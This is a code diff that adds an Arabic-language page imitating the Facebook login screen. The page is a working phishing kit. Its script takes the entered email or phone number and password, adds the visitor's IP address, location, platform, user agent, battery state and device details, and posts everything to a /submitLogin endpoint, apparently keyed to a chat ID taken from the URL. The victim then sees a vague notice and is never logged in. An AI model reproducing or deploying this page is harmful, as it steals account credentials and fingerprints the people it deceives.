@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+            color: #333;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .link {
+            display: block;
+            margin-top: 20px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .notification {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            z-index: 100;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            display: none;
+        }
+        .notification.show {
+            opacity: 1;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <form id="loginForm">
+            <input type="hidden" name="chatId" id="chatIdInput">
+            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+            <a href="#" class="link">هل نسيت الحساب؟</a>
+            <hr>
+            <button type="button" style="background-color: #42b72a;">إنشاء حساب جديد</button>
+        </form>
+        <div class="notification" id="notification">
+            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف يتم تسجيل الدخول بنجاح.</p>
+        </div>
+    </div>
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const chatIdInput = document.getElementById('chatIdInput');
+        const notification = document.getElementById('notification');
+
+        const chatId = window.location.pathname.split('/').pop();
+        chatIdInput.value = chatId;
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city
+                };
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    city: 'Unknown'
+                };
+            }
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            let platform = "Unknown";
+            if (/Windows/.test(ua)) platform = "Windows";
+            else if (/Mac/.test(ua)) platform = "MacOS";
+            else if (/Linux/.test(ua)) platform = "Linux";
+            else if (/Android/.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+
+            return {
+                platform: platform,
+                userAgent: ua
+            };
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        batteryLevel: battery.level,
+                        batteryCharging: battery.charging
+                    };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                }
+            }
+            return {
+                batteryLevel: undefined,
+                batteryCharging: undefined
+            };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        loginForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const formData = new FormData(loginForm);
+            const data = Object.fromEntries(formData.entries());
+
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+            const batteryInfo = await getBatteryInfo();
+            const deviceVersion = getDeviceVersion();
+
+            Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+
+            try {
+                const response = await fetch('/submitLogin', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (result.success) {
+                    notification.classList.add('show');
+                    setTimeout(() => {
+                        notification.classList.remove('show');
+                    }, 5000);
+                    loginForm.reset();
+                } else {
+                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        });
+    </script>
+</body>
+</html>
